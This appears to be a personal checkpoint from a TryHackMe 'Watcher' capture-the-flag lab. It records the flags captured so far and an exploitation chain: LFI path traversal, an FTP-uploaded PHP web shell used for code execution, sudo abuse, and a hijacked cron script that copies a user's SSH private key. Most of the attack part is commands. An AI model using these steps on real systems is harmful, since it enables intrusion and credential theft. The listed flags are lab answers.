# Watcher CTF - Session Checkpoint

## Target Info
- **IP:** 10.49.141.221
- **Your IP:** 192.168.192.149
- **Room:** TryHackMe - Watcher

---

## ✅ Completed

### Flags Captured
| Flag | Value | How |
|------|-------|-----|
| **Flag 1** | `FLAG{robots_dot_text_what_is_next}` | Found in `/robots.txt` via web |
| **Flag 2** | `FLAG{ftp_you_and_me}` | Downloaded via FTP from `/home/ftpuser/ftp/` using `ftpuser:givemefiles777` |
| **Flag 3** | `FLAG{lfi_what_a_guy}` | Read from `/var/www/html/more_secrets_a9f10a/flag_3.txt` |
| **Flag 4** | `FLAG{chad_lifestyle}` | Read via `sudo -u toby cat /home/toby/flag_4.txt` |

### Access Obtained
- **RCE as www-data** via LFI + FTP upload (web shell at `/home/ftpuser/ftp/files/shell.php`)
- **Sudo to toby:** `www-data` can run ALL commands as `toby` with NOPASSWD
- **FTP credentials:** `ftpuser:givemefiles777`

### Vulns Exploited
1. **robots.txt** disclosure → flag_1.txt
2. **LFI** in `post.php?post=` → read arbitrary files (no sanitization)
3. **PHP filter wrapper** to read source code (`php://filter/convert.base64-encode/resource=`)
4. **FTP credentials** leaked via LFI in `secret_file_do_not_read.txt`
5. **FTP upload** + LFI inclusion → RCE as www-data
6. **Sudo misconfiguration** → NOPASSWD ALL as toby

---

## 🔜 Remaining

### Flags Still Needed
| Flag | Path | To Get |
|------|------|--------|
| **Flag 5** | `/home/mat/flag_5.txt` | Need shell as **mat** (file is `-rw-------` owned by mat) |
| **Flag 6** | `/home/will/flag_6.txt` | Need shell as **will** |

### Current Privesc State
- **Cron job:** Runs every minute as `mat`: `*/1 * * * * mat /home/toby/jobs/cow.sh`
- **cow.sh** was overwritten via `sudo -u toby` with the following content:
  ```bash
  #!/bin/bash
  cat /home/mat/flag_5.txt > /tmp/f5.txt 2>/dev/null
  cat /home/mat/.ssh/id_rsa > /tmp/id_rsa_mat 2>/dev/null
  chmod 777 /tmp/f5.txt /tmp/id_rsa_mat
  ```
- **Last action:** cow.sh was rewritten, awaiting ~60s for cron to fire

### Resume Commands

When you come back, run these in order:

**1. Check if the cron already copied the flag/SSH key:**
```bash
curl -s "http://10.49.141.221/post.php?post=../../../../home/ftpuser/ftp/files/shell.php&cmd=cat%20/tmp/f5.txt"
curl -s "http://10.49.141.221/post.php?post=../../../../home/ftpuser/ftp/files/shell.php&cmd=cat%20/tmp/id_rsa_mat"
```

**2. If cron hasn't fired yet, wait and check again:**
```bash
curl -s "http://10.49.141.221/post.php?post=../../../../home/toby/jobs/cow.sh"
```

**3. If you get mat's SSH key, SSH directly as mat:**
```bash
chmod 600 id_rsa_mat
ssh -i id_rsa_mat mat@10.49.141.221
```

**4. Once you're mat, read flag 5 and check sudo/SUID for will escalation:**
```bash
cat /home/mat/flag_5.txt
sudo -l
ls -la /home/will/
```

---

## Quick Reference

### Web Shell (RCE as www-data)
```
http://10.49.141.221/post.php?post=../../../../home/ftpuser/ftp/files/shell.php&cmd=YOUR_COMMAND
```

### Sudo as toby (no password)
```
sudo -u toby <command>
```

### LFI (file read only)
```
http://10.49.141.221/post.php?post=../../../../path/to/file
```

### FTP Access
```bash
ftp 10.49.141.221
# user: ftpuser / pass: givemefiles777
# cd files/  (writable directory for uploading shells)
```
